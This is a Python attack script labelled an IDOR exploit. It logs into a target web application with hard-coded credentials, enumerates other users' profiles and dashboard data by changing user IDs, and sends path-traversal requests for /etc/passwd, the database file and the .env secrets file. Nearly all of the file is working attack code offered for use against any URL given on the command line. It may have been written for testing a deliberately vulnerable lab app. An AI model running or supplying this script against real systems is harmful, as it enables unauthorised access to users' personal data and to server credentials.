#!/usr/bin/env python3

import requests
import sys

class IDORExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def login_as_user(self):
        data = {'username': 'user', 'password': 'user123'}
        response = self.session.post(f"{self.target_url}/login", data=data)
        return response.status_code == 302
    
    def test_profile_idor(self):
        print("[+] Testing IDOR in profile access...")
        
        if not self.login_as_user():
            print("[ERROR] Could not login as user")
            return
        
        for user_id in range(1, 10):
            response = self.session.get(f"{self.target_url}/profile/{user_id}")
            if response.status_code == 200 and "profile" in response.text.lower():
                print(f"[SUCCESS] IDOR found - accessed profile {user_id}")
    
    def test_dashboard_idor(self):
        print("[+] Testing IDOR in dashboard...")
        
        for user_id in range(1, 10):
            params = {'userId': user_id}
            response = self.session.get(f"{self.target_url}/dashboard", params=params)
            if "email" in response.text or "password" in response.text:
                print(f"[SUCCESS] IDOR in dashboard - user {user_id} data exposed")
    
    def test_file_access_idor(self):
        print("[+] Testing IDOR in file access...")
        
        file_paths = [
            "../../../etc/passwd",
            "../../database.db",
            "../.env",
            "../../package.json"
        ]
        
        for path in file_paths:
            response = self.session.get(f"{self.target_url}/files/{path}")
            if response.status_code == 200:
                print(f"[SUCCESS] File access IDOR: {path}")
    
    def run_all_tests(self):
        print("=" * 60)
        print("INSECURE DIRECT OBJECT REFERENCE TESTING")
        print("=" * 60)
        
        self.test_profile_idor()
        self.test_dashboard_idor()
        self.test_file_access_idor()
        
        print("\n[INFO] IDOR testing completed!")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 insecure_direct_object_reference.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = IDORExploit(target_url)
    exploit.run_all_tests()

if __name__ == "__main__":
    main()